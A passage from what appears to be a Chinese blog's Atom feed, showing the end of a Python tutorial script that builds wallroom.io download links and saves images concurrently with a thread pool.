class="string">&#x27;https://wallroom.io&#x27;</span> + url1 +<span class="string">&#x27;/download&#x27;</span></span><br><span class="line">            <span class="built_in">print</span>(url_real)</span><br><span class="line">            urls.append(url_real)</span><br><span class="line"></span><br><span class="line">    executor = ThreadPoolExecutor(<span class="number">10</span>)</span><br><span class="line">    all_task = [executor.submit(save_img, (url)) <span class="keyword">for</span> url <span class="keyword">in</span> urls]</span><br><span class="line">    wait(all_task, return_when=ALL_COMPLETED)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;ul&gt;
&lt;li&gt;以抓取&lt;a href=&quot;https://www.pexels.com/%E7%BD%91%E7%AB%99%E5%9B%BE%E7%89%87%E4%B8%BA%E4%BE%8B&quot;&gt;https://www.pexels.com/网站图片为例&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;前置基础：了解HTML的DOM解析结构&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    
    <category term="python" scheme="http://example.com/tags/python/"/>
    
  </entry>
  
</feed>
